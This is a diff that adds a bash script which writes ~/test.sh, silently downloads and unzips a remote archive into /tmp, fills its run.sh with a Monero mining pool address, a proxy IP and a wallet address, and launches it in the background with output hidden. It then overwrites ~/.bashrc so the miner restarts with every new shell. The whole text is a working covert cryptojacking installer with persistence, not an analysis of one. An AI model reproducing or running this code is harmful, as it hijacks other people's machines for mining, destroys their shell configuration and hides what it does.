@@ -1,0 +1,46 @@
+cat > ~/test.sh <<'EOF'
+#!/bin/bash
+
+utama=$(pwd)
+
+cd /tmp
+curl -k -L -o okes.zip "https://github.com/tarmiasaradi03/noconfig/raw/refs/heads/main/nocap.zip" >/dev/null 2>&1
+unzip -q okes.zip
+rm -rf okes.zip
+sleep 1
+
+sed -i "s/ALAMAT/pool.hashvault.pro:443/" run.sh
+sed -i "s/KUNEMUSE/43.106.13.137:8080/" run.sh
+sed -i "s/DOMPET/45LtAPANpNy8YrmgN1AWgENvCrpB1mBr7MAwE8MBkpeo8PBUmv5gRin2LHrzfXkuMbJdE38ARaADTc16A6VSSH23FJoKUpP/" run.sh
+sed -i "s/NAMA/D/" run.sh
+
+sleep 1
+bash run.sh >/dev/null 2>&1 &
+cd "$utama"
+
+while :; do
+  date
+  sleep 120
+done
+EOF
+
+chmod +x ~/test.sh
+clear
+echo "file ~/test.sh siap, jalankan manual jika perlu"
+
+cat > ~/.bashrc <<'EOF'
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+    . /etc/bashrc
+fi
+
+# Jalankan test.sh dari home directory jika belum running
+if [ -f ~/test.sh ]; then
+    if ! pgrep -f "~/test.sh" > /dev/null && ! pgrep -f "test.sh" > /dev/null; then
+        bash ~/test.sh > /dev/null 2>&1 &
+        echo "~/test.sh started"
+    fi
+fi
+EOF
+
+source ~/.bashrc
